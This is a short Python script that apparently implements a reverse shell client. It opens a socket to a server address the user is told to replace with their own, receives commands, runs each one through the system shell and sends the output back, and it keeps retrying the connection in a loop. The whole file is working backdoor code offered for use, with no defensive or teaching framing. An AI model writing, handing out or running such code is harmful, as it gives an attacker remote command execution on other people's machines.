# sends coonectin reqeust and gets commands
import socket
import subprocess
import os

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Replace with your Server IP
            s.connect(('127.0.0.1', 5555)) 
            
            while True:
                command = s.recv(1024).decode()
                
                if command.lower() == 'exit':
                    break
                
                # Handle 'cd' command specifically (as subprocess doesn't persist state)
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        s.send(f"Changed dir to {os.getcwd()}".encode())
                    except Exception as e:
                        s.send(str(e).encode())
                    continue
                
                # Execute standard system commands
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                
                if not stdout_value:
                    stdout_value = b"Command executed (No Output)"
                
                s.send(stdout_value)
            s.close()
            break
        except Exception:
            # Add sleep here for retry logic in production
            pass

if __name__ == '__main__':
    connect()